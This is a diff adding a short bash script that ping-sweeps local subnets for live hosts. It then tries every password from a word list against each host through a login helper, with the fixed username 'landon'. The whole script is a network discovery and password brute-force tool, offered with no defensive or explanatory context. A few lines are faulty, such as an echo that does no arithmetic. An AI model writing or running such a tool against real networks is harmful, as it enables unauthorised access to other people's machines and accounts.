@@ -1,0 +1,31 @@
+#!/bin/bash
+thesubnets=( `cat "subnets.txt" `)
+if [ -f all.txt ]; then
+	
+	for SUBNET in "${thesubnets[@]}"
+	do
+		IP=$( ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' )
+		for OCTET in `seq 1 20`; do ping -c 1 -W 1 $SUBNET.$OCTET | tr \\n ' ' | awk '/1 received/ {print $2 >> "localips.txt"}' ; done
+	done
+else
+	for SUBNET in "${thesubnets[@]}"
+	do
+	IP=$( ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' )
+	echo $IP
+	SUBNET=${IP%.*}
+	CN=`echo $IP | cut -d . -f 4`
+	echo $CN = $CN + 1
+	for OCTET in `seq $CN 20`; do ping -c 1 -W 1 $SUBNET.$OCTET | tr \\n ' ' | awk '/1 received/ {print $2 >> "localips.txt"}' ; done
+	done
+fi
+
+theips=( `cat "localips.txt" `)
+passdapass=( `cat "passwdlist.txt" `)
+for SERVER in "${theips[@]}"
+do
+	for PASS in "${passdapass[@]}"
+	do
+		bash thelinuxlogin landon $PASS $SERVER
+	done
+done
+exit 0
